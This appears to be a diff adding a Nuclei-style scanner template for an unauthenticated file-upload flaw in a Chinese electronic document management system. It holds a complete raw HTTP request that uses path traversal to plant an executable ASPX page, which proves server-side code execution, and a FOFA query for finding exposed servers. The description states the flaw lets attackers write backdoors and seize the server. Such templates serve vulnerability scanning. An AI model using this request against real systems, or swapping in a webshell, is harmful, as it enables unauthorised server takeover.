@@ -1,0 +1,54 @@
+http:
+    - raw:
+        - |
+          POST /Menu/ImageManger/ImageUpload.ashx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+          Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+          Upgrade-Insecure-Requests: 1
+
+          ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+          Content-Disposition: form-data; name="isUpload"
+
+          印章图片
+          ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+          Content-Disposition: form-data; name="entid"
+
+          666
+          ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+          Content-Disposition: form-data; name="Type"
+
+          1
+          ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+          Content-Disposition: form-data; name="Filedata"; filename="../{{username}}.aspx"
+          Content-Type: text/plain
+
+          <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+          ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /{{username}}.aspx HTTP/1.1
+          Host: {{Hostname}}
+id: dianzi-ImageUpload_ashx-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="Menu/Login/ThirdLoginHandler.ashx"
+        电子资料管理系统 /Menu/ImageManger/ImageUpload.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 电子资料管理系统 ImageUpload.ashx  任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/dqDcIem7B1KUIGPMoumGjg?token=1015546094&lang=zh_CN
+    severity: high
+    tags:
+        - SSH
+variables:
+    username: '{{to_lower(rand_base(6))}}'
